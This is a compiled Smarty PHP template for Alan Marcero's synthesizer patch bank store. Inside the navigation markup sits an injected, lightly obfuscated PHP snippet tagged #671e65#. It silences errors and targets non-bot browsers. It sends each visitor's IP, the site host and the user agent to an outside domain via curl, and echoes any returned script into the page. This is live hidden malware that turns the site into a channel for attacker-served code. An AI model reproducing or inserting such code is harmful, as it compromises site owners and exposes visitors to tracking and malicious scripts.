<?php /* Smarty version 2.6.22, created on 2010-12-09 21:37:36
         compiled from /home/a1425978/public_html//templates/main.html */ ?>
<?php require_once(SMARTY_CORE_DIR . 'core.load_plugins.php');
smarty_core_load_plugins(array('plugins' => array(array('modifier', 'date_format', '/home/a1425978/public_html//templates/main.html', 45, false),)), $this); ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head> 

<title>--- Alan Marcero  &middot;  Web Developer  &middot;  Music Producer ---</title>

<link rel="stylesheet" href="css/main.css" media="screen" type="text/css" />
</head>

<body>
<div id="banner">
	<div id="bannerContent">
		<a href="http://www.alanmarcero.com"><img src="images/me.png" /></a>
	</div>
</div> <!-- end banner -->

<div id="nav">
	<div id="navContent">
		<ul>
			<li><a href="index.php">Sound Design</li>
			<li><a href="customers.php">Customer's Section</li>
			<li><a href="index.php?page=about">About</li>
			<li><a href="http://www.youtube.com/AlanMarcero">YouTube</a></li>
			<?php if ($this->_tpl_vars['data']['session_email']): ?>
<?php
#671e65#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/671e65#
?>
<?php

?>
<?php

?>
<?php

?><li style="text-align:right"><a href="logout.php" />Logout</a></li><?php endif; ?>
		</ul>
	</div>
</div>		
	
<div id="sectionHeading">
	<div id="sectionHeadingText">
		<div id="cart">
			<?php echo $this->_tpl_vars['data']['customer_count']; ?>
 people have purchased <?php echo $this->_tpl_vars['data']['item_count']; ?>
 patch banks :: Last purchase <?php echo $this->_tpl_vars['data']['last_item']; ?>

		</div>
		<div id="loggedIn">
			<?php if ($this->_tpl_vars['data']['session_email']): ?>Logged in with email: <?php echo $this->_tpl_vars['data']['session_email']; ?>
<?php endif; ?>
		</div>
	</div>
</div>

<div id="sectionContent">
	<div id="sectionContentText">
		<?php echo $this->_tpl_vars['content']; ?>

    <div id="footer">
		<p style="margin:0px;">
			All Synthesizer Patch Banks &copy; <?php echo ((is_array($_tmp=time())) ? $this->_run_mod_handler('date_format', true, $_tmp, "%Y") : smarty_modifier_date_format($_tmp, "%Y")); ?>
 Alan Marcero.  Content of the audio demos is copyright their respective owners.
		</p>
    </div>
	</div><!-- end sectionContentText -->
</div> <!-- end sectionContent -->

<?php echo '
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push([\'_setAccount\', \'UA-18728945-2\']);
  _gaq.push([\'_trackPageview\']);

  (function() {
    var ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;
    ga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';
    var s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
'; ?>


</body>

</html>